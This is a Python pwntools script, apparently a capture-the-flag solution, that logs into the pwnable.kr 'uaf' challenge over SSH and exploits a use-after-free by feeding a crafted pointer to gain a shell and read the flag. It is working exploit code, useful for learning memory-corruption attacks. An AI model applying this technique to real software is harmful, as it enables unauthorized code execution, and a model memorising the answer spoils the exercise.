#!/usr/bin/python
from pwn import *
sshPwnable=ssh(host="pwnable.kr", port=2222, user="uaf", password="guest")
uaf=sshPwnable.process(["./uaf", "24", "/dev/stdin"])

print(uaf.recvuntil('free').decode('UTF-8'))
print("3")
uaf.sendline('3')

print(uaf.recvuntil('free').decode('UTF-8'))
print("2")
uaf.sendline('2')
print(R"\x68\x15\x40\x00\x00\x00\x00\x00")
uaf.sendline("\x68\x15\x40\x00\x00\x00\x00\x00")


print(uaf.recvuntil('free').decode('UTF-8'))
print("2")
uaf.sendline('2')
print(R"\x68\x15\x40\x00\x00\x00\x00\x00")
uaf.sendline("\x68\x15\x40\x00\x00\x00\x00\x00")

#This will spawn another shell, you can put in "\x70\x15\x40\x00"+"\x00"*4 to skip this part 

print(uaf.recvuntil('free').decode('UTF-8'))
uaf.sendline('1')
uaf.sendline('cat flag')

print("\nFlag : "+uaf.recvlines(2)[1].decode('UTF-8')[2:])

uaf.close()
sshPwnable.close()
